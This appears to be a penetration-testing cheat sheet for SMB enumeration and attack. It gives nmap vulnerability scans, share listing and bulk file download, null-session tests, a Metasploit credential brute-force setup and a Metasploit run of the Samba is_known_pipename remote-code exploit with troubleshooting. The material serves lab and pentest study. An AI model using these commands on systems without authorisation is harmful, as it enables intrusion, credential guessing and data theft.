# SMB

[https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/](https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/)

Using NMAP Scan for popular RCE exploits.

```
sudo nmap -p 139,445 --script smb-vuln* <ip-addr> -oA nmap/smb-vuln
```

Identify the SMB/OS version.

```
nmap -v -p 139,445 --script=smb-os-discovery.nse <ip-addr>
```

Enumerate users once you have valid credentials:

```
sudo nmap --script=smb-enum-users -p 445 192.168.1.2 --script-args smbuser=<user>,smbpass=<password>
```

Using NBTSCAN To scan a subnet for list of hostnames:

```
nbtscan -v <targetRange>
```

Using SMBMAP To list out the shares and associated permissions with Anonymous Access:

```
smbmap -H <ip-addr>
```

To list out the shares recursively:

```
smbmap -R <sharename> -H <ip-addr>
```

To list shares as an authenticated user:

```
smbmap -d <domain> -u <username> -p <password> -H <ip-addr>
```

To list the shares as a Guest user, just provide a username that doesn’t exist.

```
smbmap -u DoesNotExist -H <ip-addr>
```

To download a particular file.

```
smbmap -R <sharename> -H <ip-addr> -A <filename> -q
```

Using SMBCLIENT To list out the shares:

```
smbclient -L \\\\<ip-addr>
```

To connect to shares:

```
sudo smbclient \\\\<ip-addr>\\<share>
```

Downloading files: Once connected, you can download files. You’ll want to disable interactive prompts and turn recursive mode ON.

```
smb: /> prompt
smb: /> recurse
smb: /> mget *
```

Using ENUM4LINUX The following command will attempt to establish a null session with the target and then use RPC to extract useful information.

```
enum4linux -a [ip]
```

Example output is long, but some highlights to look for: • Listing of file shares and printers. • Domain/Workgroup information. • Password policy information. • RID cycling output to enumerate users and groups.

Using METASPLOIT Bruteforcing credentials:

```
use auxiliary/scanner/smb/smb_login
set BLANK_PASSWORDS true
set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/best15.txt
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set RHOSTS <ipAddr>
```

Mounting SMB Shares in Linux The following command will mount the remote file-share to /mnt/smb/ (this directory must exist first) and prompt you for the password.

```
mount -t cifs -o username=<user> //<targetIP>/<shareName> /mnt/smb/
```

Another way to mount a share from Linux is as follows:

```
sudo mount.cifs //<targetIP>/share /mnt/share username=,password=
```

Using SMBCACLS Viewing file permissions, owners, and ACLs of shares.

```
smbcacls -N '//<targetIP>/<shareName>' /<childDir>
```

To use this recursively, you can use a for loop in Bash.

```
cd <mountedShare>
for i in $(ls); do echo $1; smbcacls -N '//<targetIP>/<shareName>' /$i; done
```

Enumeration from Windows Utilities To get the Name Table:

```
nbtstat -A <targetIP>
```

To see a list of running shares:

```
net view <targetIP>
```

You can map a share to a drive letter, such as K:

```
net use K: \\<targetIP>\share
```

Testing for null session:

```
net use \\<targetIP>\IPC$ "" /u:""
```

Gaining a Shell Once you have valid credentials on the machine, or a valid NTLM hash, you can leverage the following guide to gain a shell.

https://infinitelogins.com/2020/09/05/popping-remote-shells-pth-winexe-on-windows/

Enumerating SMB Version If your tools aren’t working to enumerate the version, you can establish a connection via smbclient and then extract the Samba/SMB version through a packetcapture. To automate the process, you can use the script available at https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon\_enum/smbver.sh

## Troubleshooting Common Errors:

### **protocol negotiation failed: NT\_STATUS\_CONNECTION\_DISCONNECTED**

This error occurs because your modern tools are not able to communicate to older, insecure protocols. You just need to tell your smbd daemon to use the weaker and more insecure protocols. Note: If you are using smbd in real life for file and printer sharing, I don’t recommend leaving you system like this. Open the following files in your favorite text editor.

```
/etc/samba/smb.conf
```

Find the Global section, and add the following line.

```
client min protocol = LANMAN1
```

With that line added, restart your smdb service and you should now be able to connect.

```
service smbd restart
```

### smbclient fix for "protocol negotiation failed: NT\_STATUS\_CONNECTION\_DISCONNECTED"

```
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]'

smbclient -L 10.11.1.115 -U "" -N

Unix.Samba 2.2.7
```

### Metasploit SMB Error

```
searchsploit samba
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' 
Arbitrary Module Load (Metasploit)| linux/remote/42084.rb
```

```
msfconsole
---
msf6 > search samba

14  exploit/linux/samba/is_known_pipename                2017-03-24
       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load

use 14

set RHOSTS 192.168.1.2
set SMB_SHARE_NAME TestShare
run

192.168.1.2:445 - Exploit failed: RubySMB::Error::EncryptionError Communication error 
with the remote host: Socket read returned nil. The server supports encryption but was
 not able to handle the encrypted request.
```

Error solving - https://www.whitehat.de/msf-metasploit-rubysmb-error-encryptionerror-communication-error-with-the-remote-host

set SMB::AlwaysEncrypt false&#x20;

set SMB::ProtocolVersion 1
